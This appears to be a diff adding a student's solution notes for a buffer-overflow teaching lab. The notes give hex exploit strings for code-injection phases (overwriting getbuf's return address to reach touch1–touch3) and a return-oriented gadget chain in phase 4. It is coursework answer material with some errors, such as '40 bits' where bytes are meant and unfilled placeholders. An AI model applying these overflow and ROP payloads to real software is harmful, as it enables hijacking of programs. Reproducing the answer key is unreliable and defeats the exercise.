@@ -1,0 +1,45 @@
+Phase_1:
+- See how much memory getbuf allocates, (0x28) convert from hex to dec
+- See the memory address of touch1
+- Answer requires a padding of 40 bits to fill up the 0x28 allocated followed by the touch1 return address
+- Use the return address of Touch1 in little edian, padding with enough 0's to make a byte (8 0's)
+
+Phase_2:
+- Write a .s script to move the cookie into the %rdi register
+- in getbuf the mov %rsp, %rdi function points the stack pointer to rdi, so rsp points to the cookie
+- gcc -c p2.s; objdump -d p2.o > p2.d (opening p2.d will show dissas, this is the memory address you want for your cookie)
+- find addr of %rsp, do this after you input a string long enough, this will subtract 40 bits of the stack pointer. 
+- this ensures the cookie is in the 'front' of the buffer. The padding will then override the return address to touch 2
+- Use the return address of the touch2 
+
+48 c7 c7 ba a5 ad 7f c3 // cookie address
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // buffer
+48 4a 63 55 00 00 00 00 // rsp address
+9e 12 40 00 00 00 00 00 // touch2 return address
+
+
+Phase_3: 
+- similar as before, but we want to add additional buffer in front of the cookie so the cookie does not get overwritten by the other functions being called
+
+48 c7 c7 80 4a 63 55 c3 // rsp + 0x38(buffer + 8 bites for rsp return + 8 bites for touch3 adddr) where cookie address is with padding in front
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 4a 63 55 00 00 00 00 // rsp address
+af 13 40 00 00 00 00 00 // touch3 address
+37 66 61 64 61 35 62 61 // cookie string
+
+Phase_4:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // first 40 is buffer, just padding
+6a 14 40 00 00 00 00 00 // gadget 1: popq %rax addr, starts at last byte so we have to add __ to get correct addr
+ba a5 ad 7f 00 00 00 00 // cookie
+5b 14 40 00 00 00 00 00 // gadget 2: mov %rax to %rdi, starts at last byte so we have to add __ to get correct addr
+9e 12 40 00 00 00 00 00 // touch2 addr
